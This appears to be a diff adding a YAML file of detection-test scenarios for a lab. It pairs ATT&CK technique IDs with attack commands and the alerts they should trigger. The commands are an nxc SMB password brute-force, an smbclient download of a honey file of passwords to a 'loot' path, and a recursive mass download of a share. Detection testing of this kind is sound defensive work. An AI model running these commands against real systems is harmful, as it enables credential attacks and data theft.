@@ -1,0 +1,21 @@
+# Each scenario describes an attack and the alert that he must generate.
+- id: T1110.001
+  name: SMB brute-force
+  attack: "nxc smb 192.168.158.20 -u 'Win10 Lab' -p /home/user/wordlists/passwords.txt"
+  success_signal: "Pwn3d!"
+  rule: "Brute-force SMB success"
+  timeout: 600
+
+- id: T1039
+  name: Sensitive file read (honey file)
+  attack: "smbclient //192.168.158.20/Finances -U 'Win10 Lab%1234' -c 'get users_passwords.txt /tmp/loot.txt'"
+  success_signal: "getting file"
+  rule: "Sensitive file access through SMB (possible exfiltration)"
+  timeout: 600
+
+- id: T1039-mass
+  name: Mass file scanning via SMB
+  attack: "rm -rf /tmp/massscan && mkdir -p /tmp/massscan && cd /tmp/massscan && smbclient //192.168.158.20/Finances -U 'Win10 Lab%1234' -c 'prompt OFF; recurse ON; mget *'"
+  success_signal: "getting file"
+  rule: "Mass file scanning via SMB (potential automated collection)"
+  timeout: 600
